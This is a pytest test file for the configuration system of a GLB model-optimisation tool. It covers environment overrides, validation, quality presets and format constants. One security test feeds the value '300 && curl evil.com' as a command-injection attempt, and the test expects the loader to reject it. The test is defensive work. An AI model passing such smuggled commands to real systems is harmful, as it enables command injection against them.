"""
Tests for configuration system
Tests configuration loading, validation, and environment handling
"""

import pytest
import os
import json
import tempfile
from unittest.mock import patch

from config import OptimizationConfig, GLBConstants, OptimizationThresholds


class TestOptimizationConfig:
    """Test OptimizationConfig class"""
    
    @pytest.mark.unit
    def test_config_initialization_defaults(self):
        """Test configuration initialization with default values"""
        config = OptimizationConfig()
        
        # Test default values
        assert config.MAX_FILE_SIZE == 500 * 1024 * 1024  # 500MB in bytes
        assert config.MIN_FILE_SIZE == 1024  # 1KB
        assert config.SUBPROCESS_TIMEOUT == 300  # 5 minutes
        assert config.PARALLEL_TIMEOUT == 120  # 2 minutes
        
        # Test quality presets exist
        assert isinstance(config.QUALITY_PRESETS, dict)
        assert 'high' in config.QUALITY_PRESETS
        assert 'balanced' in config.QUALITY_PRESETS
        assert 'maximum_compression' in config.QUALITY_PRESETS

    @pytest.mark.unit
    def test_config_from_env_defaults(self):
        """Test configuration loading with default values"""
        config = OptimizationConfig.from_env()
        
        # Test default values
        assert config.MAX_FILE_SIZE == 500 * 1024 * 1024  # 500MB in bytes
        assert config.SUBPROCESS_TIMEOUT == 300
        assert config.PARALLEL_TIMEOUT == 120
        assert config.MIN_FILE_SIZE == 1024

    @pytest.mark.unit
    def test_config_from_env_overrides(self):
        """Test configuration loading with environment variable overrides"""
        test_env = {
            'GLB_MAX_FILE_SIZE': str(100 * 1024 * 1024),  # 100MB in bytes
            'GLB_SUBPROCESS_TIMEOUT': '600',
            'GLB_PARALLEL_TIMEOUT': '180',
            'GLB_MIN_FILE_SIZE': '2048'
        }
        
        with patch.dict(os.environ, test_env):
            config = OptimizationConfig.from_env()
            
            assert config.MAX_FILE_SIZE == 100 * 1024 * 1024
            assert config.SUBPROCESS_TIMEOUT == 600
            assert config.PARALLEL_TIMEOUT == 180
            assert config.MIN_FILE_SIZE == 2048

    @pytest.mark.unit
    def test_config_validation_valid(self):
        """Test configuration validation with valid values"""
        validation_result = OptimizationConfig.validate_settings()
        
        # Should have no critical issues
        assert validation_result['valid'] is True
        assert len(validation_result['issues']) == 0

    @pytest.mark.unit
    def test_config_validation_invalid_values(self):
        """Test configuration validation with invalid values"""
        test_env = {
            'GLB_MAX_FILE_SIZE': '0',      # Invalid: zero size
            'GLB_SUBPROCESS_TIMEOUT': '-1',   # Invalid: negative timeout
            'GLB_MIN_FILE_SIZE': '1000000000',  # Invalid: larger than max
        }
        
        with patch.dict(os.environ, test_env):
            # Create a temporary config instance for validation
            OptimizationConfig._temp_instance = OptimizationConfig.from_env()
            validation_result = OptimizationConfig.validate_settings()
            
            # Should have issues for invalid values
            assert validation_result['valid'] is False
            assert len(validation_result['issues']) > 0
            
            # Clean up temp instance
            delattr(OptimizationConfig, '_temp_instance')

    @pytest.mark.unit
    def test_config_to_dict(self):
        """Test configuration serialization to dictionary"""
        config = OptimizationConfig()
        config_dict = config.to_dict()
        
        # Test expected keys
        assert 'max_file_size_mb' in config_dict
        assert 'min_file_size_bytes' in config_dict
        assert 'subprocess_timeout' in config_dict
        assert 'quality_levels' in config_dict
        
        # Should be JSON serializable
        json_str = json.dumps(config_dict)
        assert isinstance(json_str, str)

    @pytest.mark.unit
    def test_quality_settings_retrieval(self):
        """Test quality settings retrieval for different levels"""
        quality_levels = ['high', 'balanced', 'maximum_compression']
        
        for level in quality_levels:
            settings = OptimizationConfig.get_quality_settings(level)
            
            assert isinstance(settings, dict)
            assert 'description' in settings
            assert 'simplify_ratio' in settings
            assert 'texture_quality' in settings
            assert 'compression_level' in settings

    @pytest.mark.unit
    def test_invalid_quality_level(self):
        """Test handling of invalid quality level"""
        # Should not raise exception but fall back to balanced and print warning
        settings = OptimizationConfig.get_quality_settings('invalid_level')
        
        # Should return balanced settings as fallback
        balanced_settings = OptimizationConfig.get_quality_settings('balanced')
        assert settings == balanced_settings

    @pytest.mark.unit
    def test_get_available_quality_levels(self):
        """Test getting available quality levels with descriptions"""
        quality_levels = OptimizationConfig.get_available_quality_levels()
        
        assert isinstance(quality_levels, dict)
        assert 'high' in quality_levels
        assert 'balanced' in quality_levels  
        assert 'maximum_compression' in quality_levels
        
        # Each should have a description
        for level, description in quality_levels.items():
            assert isinstance(description, str)
            assert len(description) > 0

    @pytest.mark.unit
    def test_config_file_loading(self, tmp_path):
        """Test configuration loading from JSON file"""
        config_file = tmp_path / "test_config.json"
        config_data = {
            "MAX_FILE_SIZE": 200 * 1024 * 1024,
            "SUBPROCESS_TIMEOUT": 450
        }
        
        with open(config_file, 'w') as f:
            json.dump(config_data, f)
        
        # Use environment variable to specify config file
        test_env = {'GLB_CONFIG_FILE': str(config_file)}
        
        with patch.dict(os.environ, test_env):
            config = OptimizationConfig.from_env()
            
            assert config.MAX_FILE_SIZE == 200 * 1024 * 1024
            assert config.SUBPROCESS_TIMEOUT == 450


class TestGLBConstants:
    """Test GLB format constants"""
    
    @pytest.mark.unit
    def test_glb_constants_values(self):
        """Test GLB constants have correct values"""
        assert GLBConstants.HEADER_LENGTH == 12
        assert GLBConstants.MAGIC_NUMBER == b'glTF'
        assert GLBConstants.SUPPORTED_VERSION == 2
        assert GLBConstants.CHUNK_HEADER_LENGTH == 8
        assert GLBConstants.JSON_CHUNK_TYPE == b'JSON'

    @pytest.mark.unit
    def test_glb_constants_types(self):
        """Test GLB constants have correct types"""
        assert isinstance(GLBConstants.HEADER_LENGTH, int)
        assert isinstance(GLBConstants.MAGIC_NUMBER, bytes)
        assert isinstance(GLBConstants.SUPPORTED_VERSION, int)
        assert isinstance(GLBConstants.CHUNK_HEADER_LENGTH, int)
        assert isinstance(GLBConstants.JSON_CHUNK_TYPE, bytes)


class TestOptimizationThresholds:
    """Test optimization threshold constants"""
    
    @pytest.mark.unit
    def test_optimization_thresholds_values(self):
        """Test optimization thresholds have reasonable values"""
        assert OptimizationThresholds.HIGH_VERTEX_COUNT_THRESHOLD == 50_000
        assert OptimizationThresholds.VERY_HIGH_VERTEX_COUNT == 100_000
        assert OptimizationThresholds.LARGE_FILE_SIZE_THRESHOLD == 5_000_000
        
        # Test simplify ratios
        assert OptimizationThresholds.SIMPLIFY_RATIOS['high'] == 0.8
        assert OptimizationThresholds.SIMPLIFY_RATIOS['balanced'] == 0.6
        assert OptimizationThresholds.SIMPLIFY_RATIOS['maximum_compression'] == 0.4

    @pytest.mark.unit
    def test_optimization_thresholds_types(self):
        """Test optimization thresholds have correct types"""
        assert isinstance(OptimizationThresholds.HIGH_VERTEX_COUNT_THRESHOLD, int)
        assert isinstance(OptimizationThresholds.VERY_HIGH_VERTEX_COUNT, int)
        assert isinstance(OptimizationThresholds.LARGE_FILE_SIZE_THRESHOLD, int)
        assert isinstance(OptimizationThresholds.SIMPLIFY_RATIOS, dict)


class TestQualityPresets:
    """Test quality preset configurations"""
    
    @pytest.mark.unit
    def test_quality_presets_structure(self):
        """Test quality presets have correct structure"""
        config = OptimizationConfig()
        
        for level_name, settings in config.QUALITY_PRESETS.items():
            # Test required keys exist
            required_keys = [
                'description', 'simplify_ratio', 'texture_quality', 
                'compression_level', 'draco_compression_level', 'enable_ktx2'
            ]
            
            for key in required_keys:
                assert key in settings, f"Missing key '{key}' in {level_name} settings"

    @pytest.mark.unit
    def test_quality_presets_logic(self):
        """Test quality presets have logical settings"""
        config = OptimizationConfig()
        
        # High quality should have highest values
        high_settings = config.QUALITY_PRESETS['high']
        balanced_settings = config.QUALITY_PRESETS['balanced']
        max_comp_settings = config.QUALITY_PRESETS['maximum_compression']
        
        # Simplify ratio should decrease as compression increases
        assert high_settings['simplify_ratio'] > balanced_settings['simplify_ratio']
        assert balanced_settings['simplify_ratio'] > max_comp_settings['simplify_ratio']
        
        # Texture quality should decrease as compression increases
        assert high_settings['texture_quality'] >= balanced_settings['texture_quality']
        assert balanced_settings['texture_quality'] >= max_comp_settings['texture_quality']

    @pytest.mark.unit
    def test_quality_presets_bounds(self):
        """Test quality presets have values within reasonable bounds"""
        config = OptimizationConfig()
        
        for level_name, settings in config.QUALITY_PRESETS.items():
            # Simplify ratio should be between 0 and 1
            assert 0 < settings['simplify_ratio'] <= 1
            
            # Texture quality should be between 0 and 100
            assert 0 < settings['texture_quality'] <= 100
            
            # Compression level should be reasonable
            assert 0 < settings['compression_level'] <= 10


class TestEnvironmentSanitization:
    """Test environment variable sanitization and security"""
    
    @pytest.mark.unit
    @pytest.mark.security
    def test_extreme_values_sanitization(self):
        """Test sanitization of extreme environment values"""
        test_env = {
            'GLB_MAX_FILE_SIZE': str(10 * 1024 * 1024 * 1024),  # 10GB - very large
            'GLB_SUBPROCESS_TIMEOUT': '3600',  # 1 hour - very long
        }
        
        with patch.dict(os.environ, test_env):
            config = OptimizationConfig.from_env()
            
            # Should accept valid but extreme values
            assert config.MAX_FILE_SIZE == 10 * 1024 * 1024 * 1024
            assert config.SUBPROCESS_TIMEOUT == 3600

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_type_handling(self):
        """Test handling of invalid environment variable types"""
        test_env = {
            'GLB_MAX_FILE_SIZE': 'not_a_number',
            'GLB_SUBPROCESS_TIMEOUT': 'also_not_a_number',
        }
        
        with patch.dict(os.environ, test_env):
            # Should raise ValueError for invalid integer conversion
            with pytest.raises(ValueError):
                OptimizationConfig.from_env()

    @pytest.mark.unit
    @pytest.mark.security
    def test_injection_prevention(self):
        """Test prevention of injection attacks through environment variables"""
        test_env = {
            'GLB_SUBPROCESS_TIMEOUT': '300 && curl evil.com',  # Command injection attempt
        }
        
        with patch.dict(os.environ, test_env):
            # Should raise ValueError for invalid integer conversion
            with pytest.raises(ValueError):
                OptimizationConfig.from_env()


class TestConfigurationValidation:
    """Test comprehensive configuration validation"""
    
    @pytest.mark.unit
    def test_comprehensive_validation(self):
        """Test comprehensive configuration validation"""
        validation_result = OptimizationConfig.validate_settings()
        
        assert isinstance(validation_result, dict)
        assert 'valid' in validation_result
        assert 'issues' in validation_result
        assert 'summary' in validation_result
        
        assert isinstance(validation_result['valid'], bool)
        assert isinstance(validation_result['issues'], list)
        assert isinstance(validation_result['summary'], str)

    @pytest.mark.unit
    def test_validation_with_problematic_config(self):
        """Test validation with intentionally problematic configuration"""
        test_env = {
            'GLB_MAX_FILE_SIZE': '100',  # Too small 
            'GLB_MIN_FILE_SIZE': '200',  # Larger than max
            'GLB_SUBPROCESS_TIMEOUT': '0',  # Invalid
        }
        
        with patch.dict(os.environ, test_env):
            OptimizationConfig._temp_instance = OptimizationConfig.from_env()
            validation_result = OptimizationConfig.validate_settings()
            
            assert validation_result['valid'] is False
            assert len(validation_result['issues']) > 0
            
            # Clean up
            delattr(OptimizationConfig, '_temp_instance')

    @pytest.mark.unit
    def test_validation_output_format(self):
        """Test validation output format"""
        validation_result = OptimizationConfig.validate_settings()
        
        # Should be JSON serializable
        json_str = json.dumps(validation_result)
        assert isinstance(json_str, str)
        
        # Check summary format
        assert 'Configuration validation:' in validation_result['summary']
        assert 'issues found' in validation_result['summary']